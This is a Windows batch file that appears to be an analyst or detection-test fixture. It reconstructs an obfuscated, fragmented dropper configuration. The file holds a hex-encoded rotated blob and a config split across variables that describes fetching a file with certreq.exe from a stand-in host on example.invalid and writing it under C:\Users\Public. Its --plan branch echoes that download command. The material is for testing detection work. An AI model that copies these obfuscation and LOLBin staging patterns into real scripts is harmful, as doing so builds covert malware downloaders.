@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|rotate_left
rem HUNTRESS-MATERIAL:ec7a62f8e6e8cae0e67ac2c6e2ead2e4cabee4cadadee8ca58eee4d2e8cabeccd2d8caf8c2c8c2e0e8cae47ac6cae4e8e4cae25ccaf0caf8e6e8c2cecabec6deeadce87a62f8cee4c2e0d07ae6c2dacabed8c2dcceeac2cecaf8dccaf0e8bed8c2dcceeac2ceca7adcdedccaf8c6c2dae0c2d2cedcbed2c87ac6c2dae0c2d2cedc5a72726068ca60cc686668f8eae4d87ad0e8e8e0e6745e5e72726068ca60cc6866685ccaf0c2dae0d8ca5cd2dcecc2d8d2c85e6ec86262ccc8cac65cc8c2e8f8ccd2d8cabee0c2e8d07a8674b8aae6cae4e6b8a0eac4d8d2c6b890eadce8e4cae6e698c2c4b8e6e8c2ceca5a72726068ca60cc6866685cc8c2e8
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set FrAg0=v=1^|steps=acquire_remote,write_file^|adapter=certreq.exe^|stage_c
set FrAg1=ount=1^|graph=same_language^|next_language=none^|campaign_id=campa
set FrAg2=ign-9904e0f434^|url=https://9904e0f434.example.invalid/7d11fdec.
set FrAg3=dat^|file_path=C:\Users\Public\HuntressLab\stage-9904e0f434.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=86c3e217"
ver >nul
if errorlevel 1 exit /b 1
set "ReCoVeReD=%FrAg0%%FrAg1%%FrAg2%%FrAg3%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo certreq.exe acquire https://9904e0f434.example.invalid/7d11fdec.dat to C:\Users\Public\HuntressLab\stage-9904e0f434.dat
exit /b 0
